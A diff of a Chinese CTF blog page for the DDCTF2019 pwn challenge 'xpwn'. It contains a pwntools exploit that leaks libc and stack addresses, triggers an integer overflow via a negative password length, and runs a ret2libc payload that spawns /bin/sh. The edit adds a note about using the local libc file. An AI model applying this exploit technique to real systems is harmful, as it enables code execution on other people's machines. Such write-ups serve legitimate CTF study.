@@ -22,7 +22,7 @@
 <meta property="og:site_name" content="4eriri&#39;s blog">
 <meta property="og:description" content="自己补一下栈">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-05-16T16:01:38.002Z">
+<meta property="og:updated_time" content="2019-05-17T14:10:43.674Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DDCTF2019-pwn">
 <meta name="twitter:description" content="自己补一下栈">
@@ -228,7 +228,9 @@
         <p>自己补一下栈</p>
 <a id="more"></a>
 <h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./xpwn&quot;)libc=ELF(&quot;./libc.so.6&quot;)sh.recvuntil(&apos;Enter username: &apos;)sh.send(&apos;a&apos;*4*15)sh.recvuntil(&apos;a&apos;*4*15)setbuf=u32(sh.recv(4))sh.recv(8)ebp=u32(sh.recv(4))libcbase=setbuf-libc.symbols[&apos;setbuf&apos;]print hex(libcbase)sh.recvuntil(&apos;Please set the length of password: &apos;)sh.sendline(&apos;-1&apos;)sh.recvuntil(&apos;Enter password(lenth 4294967295): &apos;)sh.send(&apos;a&apos;*4*17+p32(ebp-8+0x20)+&apos;a&apos;*4*6+p32(libcbase+libc.symbols[&apos;system&apos;])+p32(0xdeadbeef)+p32(libcbase+libc.search(&apos;/bin/sh&apos;).next()))sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>当时没做出来，因为如果直接填充a会报错，中间有一部分是要自己补的，感觉和canary差不多，现在做的时候没远程环境了，本地打不下来，网上找了其他人写的脚本，也跑不了，不知道哪里出了问题。</p>
+<p>当时没做出来，因为如果直接填充a会报错，中间有一部分是要自己补的，感觉和canary差不多，现在做的时候没远程环境了，本地打不下来。</p>
+<h1 id="TCL"><a href="#TCL" class="headerlink" title="TCL"></a>TCL</h1><p>libc文件用本地的就行了，看来本地运行的libc和给的libc不一样…</p>
+<p><code>libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)</code></p>
 
       
     </div>
@@ -240,7 +242,7 @@
         <p><span>本文标题:</span><a href="/2019/05/16/DDCTF2019-pwn/">DDCTF2019-pwn</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2019-05-16, 22:30:32</p>
-        <p><span>最后更新:</span>2019-05-17, 00:01:38</p>
+        <p><span>最后更新:</span>2019-05-17, 22:10:43</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/05/16/DDCTF2019-pwn/" title="DDCTF2019-pwn">http://yoursite.com/2019/05/16/DDCTF2019-pwn/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/16/DDCTF2019-pwn/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -270,7 +272,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">1.</span> <span class="toc-text">EXP</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TCL"><span class="toc-number">2.</span> <span class="toc-text">TCL</span></a></li></ol>
         
     </div>
     <style>
